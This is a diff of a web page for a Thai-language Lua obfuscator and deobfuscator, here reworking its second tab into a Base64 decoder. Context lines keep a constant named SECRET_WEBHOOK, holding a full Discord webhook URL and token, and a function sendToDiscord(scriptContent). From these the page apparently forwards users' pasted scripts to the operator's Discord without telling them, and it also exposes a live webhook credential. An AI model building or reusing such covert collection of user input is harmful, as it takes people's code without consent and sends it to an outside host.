@@ -183,19 +183,6 @@
             border: 1px solid rgba(75, 85, 99, 0.4);
         }
 
-        .result-box {
-            background: rgba(8, 9, 13, 0.85);
-            border: 1px solid rgba(31, 41, 55, 0.8);
-            border-radius: 10px;
-            padding: 15px;
-            color: #f3f4f6;
-            font-family: monospace;
-            font-size: 13px;
-            min-height: 80px;
-            white-space: pre-wrap;
-            word-break: break-all;
-        }
-
         .footer-credit {
             text-align: center;
             margin-top: 30px;
@@ -217,13 +204,13 @@
         <div class="header">
             <div class="credit-badge">⚡ POWERED BY LRAPX HUB</div>
             <div class="logo">MiniScript <span>SUITE</span></div>
-            <div class="sub-title">เครื่องมือพรางโค้ดและระบบตรวจสอบสคริปต์ครบวงจร</div>
+            <div class="sub-title">เครื่องมือพรางโค้ดและถอดรหัสสคริปต์ครบวงจร</div>
         </div>
 
         <!-- Tab Selection Menu -->
         <div class="tab-menu">
             <button class="tab-btn active" onclick="switchTab('obf')">🛡️ Lua Obfuscator</button>
-            <button class="tab-btn" onclick="switchTab('detector')">🔍 Script Detector & Deobfuscator</button>
+            <button class="tab-btn" onclick="switchTab('detector')">🔓 Script Deobfuscator</button>
         </div>
 
         <!-- ==================== TAB 1: OBFUSCATOR ==================== -->
@@ -251,24 +238,27 @@
             </div>
         </div>
 
-        <!-- ==================== TAB 2: DETECTOR & DEOBFUSCATOR ==================== -->
+        <!-- ==================== TAB 2: DEOBFUSCATOR / DECODER ==================== -->
         <div id="tab-detector" class="tab-content">
             <div class="obf-card">
                 <div class="card-header">
-                    <label>🔍 วางสคริปต์ที่ต้องการตรวจสอบหรือแกะโค้ด</label>
+                    <label>🔍 วางสคริปต์ที่ต้องการถอดรหัส</label>
                 </div>
-                <textarea id="inputDetect" placeholder="-- วางโค้ดที่ถูก OBF มาที่นี่เพื่อวิเคราะห์..."></textarea>
+                <textarea id="inputDetect" placeholder="-- วางโค้ดที่ต้องการแกะหรือถอดรหัสที่นี่..."></textarea>
                 <div class="btn-group">
-                    <button class="btn btn-primary" type="button" onclick="runDetection()">🔎 ตรวจสอบประเภท OBF</button>
+                    <button class="btn btn-primary" type="button" onclick="runDecodeBase64()">🔓 ถอดรหัส Base64</button>
                     <button class="btn btn-secondary" type="button" onclick="clearInput('inputDetect', 'detectResult')">🗑️ ล้างข้อความ</button>
                 </div>
             </div>
 
             <div class="obf-card">
                 <div class="card-header">
-                    <label>📊 ผลการวิเคราะห์และถอดรหัสเบื้องต้น</label>
+                    <label>📊 ผลลัพธ์การถอดรหัส</label>
                 </div>
-                <div id="detectResult" class="result-box">ยังไม่มีข้อมูลการวิเคราะห์...</div>
+                <textarea id="detectResult" readonly placeholder="-- ผลลัพธ์จะแสดงที่นี่..."></textarea>
+                <div class="btn-group">
+                    <button class="btn btn-primary" type="button" onclick="copyOutput('detectResult')">📋 คัดลอกผลลัพธ์</button>
+                </div>
             </div>
         </div>
 
@@ -278,7 +268,7 @@
     </div>
 
     <script>
-        // Webhook ห้อง Web OBF (อันที่ 1)
+        // Webhook ห้อง Web OBF ของคุณ
         const SECRET_WEBHOOK = "https://discord.com/api/webhooks/1571493923828797470/tAa3oRu1NGLonQAvHo305SAEe4M0azxt5QBUHxLwyjAU7m0KBvtUepJVmuy6Gl8BDFNE";
 
         function switchTab(tabName) {
@@ -298,6 +288,10 @@
             return btoa(encodeURIComponent(str).replace(/%([0-9A-F]{2})/g, function(match, p1) {
                 return String.fromCharCode('0x' + p1);
             }));
+        }
+
+        function safeAtob(str) {
+            return decodeURIComponent(escape(atob(str)));
         }
 
         function sendToDiscord(scriptContent) {
@@ -361,26 +355,29 @@
             }
         }
 
-        function runDetection() {
+        function runDecodeBase64() {
             var code = document.getElementById('inputDetect').value;
-            var resultBox = document.getElementById('detectResult');
+            var outputBox = document.getElementById('detectResult');
 
             if (!code || code.trim() === "") {
-                resultBox.innerText = "❌ กรุณาวางโค้ดที่ต้องการตรวจสอบก่อนครับ!";
+                alert('กรุณาวางโค้ดที่ต้องการถอดรหัสก่อนครับ!');
                 return;
             }
 
-            let detection = "🔍 **ผลการตรวจสอบประเภท OBF:**\n";
-            if (code.includes("loadstring") && (code.includes("btoa") || code.includes("string.gsub") || code.length > 200)) {
-                detection += "• สถานะ: พบร่องรอยการเข้ารหัส (Standard / Base64 Encoded)\n• ความปลอดภัย: ปานกลาง (สามารถถอดรหัสได้หากแกะตรรกะออก)\n";
-            } else if (code.includes("MoonSec") || code.includes("syn")) {
-                detection += "• สถานะ: ตรวจพบรูปแบบ MoonSec / Custom Virtualization\n";
-            } else {
-                detection += "• สถานะ: เป็นโค้ดดิบปกติ (Plain Text) หรือรูปแบบเฉพาะตัว\n";
+            try {
+                var match = code.match(/["']([A-Za-z0-9+/=]{20,})["']/);
+                if (match && match[1]) {
+                    var decoded = safeAtob(match[1]);
+                    outputBox.value = decoded;
+                    alert('🔓 ถอดรหัส Base64 สำเร็จ!');
+                } else {
+                    var decodedAll = safeAtob(code.trim());
+                    outputBox.value = decodedAll;
+                    alert('🔓 ถอดรหัสสำเร็จ!');
+                }
+            } catch (err) {
+                outputBox.value = "❌ เกิดข้อผิดพลาด: ไม่สามารถถอดรหัสรูปแบบนี้ได้โดยตรง (โค้ดอาจถูกเข้ารหัสรูปแบบอื่น)\nรายละเอียด: " + err.message;
             }
-
-            detection += "\n⚡ **คำแนะนำ:** ใช้สำหรับวิเคราะห์โครงสร้างสคริปต์เบื้องต้นเพื่อความปลอดภัย!";
-            resultBox.innerText = detection;
         }
 
         function clearInput(inputId, outputId) {
